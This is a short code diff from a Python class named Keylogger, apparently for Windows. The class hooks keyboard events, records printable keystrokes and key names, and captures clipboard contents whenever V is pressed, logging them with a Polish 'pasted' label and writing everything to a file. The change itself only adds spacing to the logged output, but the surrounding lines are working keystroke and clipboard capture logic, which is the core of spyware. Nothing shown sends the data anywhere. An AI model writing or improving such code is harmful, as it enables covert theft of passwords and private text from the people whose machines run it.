@@ -46,7 +46,7 @@ class Keylogger():
 
         if event.Ascii > 32 and event.Ascii < 127:
             #write to file
-            a = (chr(event.Ascii))
+            a = (" ".join(chr(event.Ascii)))
             self.saver.write_to_file(a)
         else:
             if event.Key == "V":
@@ -54,11 +54,11 @@ class Keylogger():
                 pasted = win32clipboard.GetClipboardData()
                 win32clipboard.CloseClipboard()
                 #write to file
-                a =(" [Wklejono:] %s" % pasted)
+                a =(" [Wklejono:] %s " % pasted)
                 self.saver.write_to_file(a)
             else:
                 #write to file
-                a= ("%s" % event.Key)
+                a= ("%s " % event.Key)
                 self.saver.write_to_file(a)
         return True
 
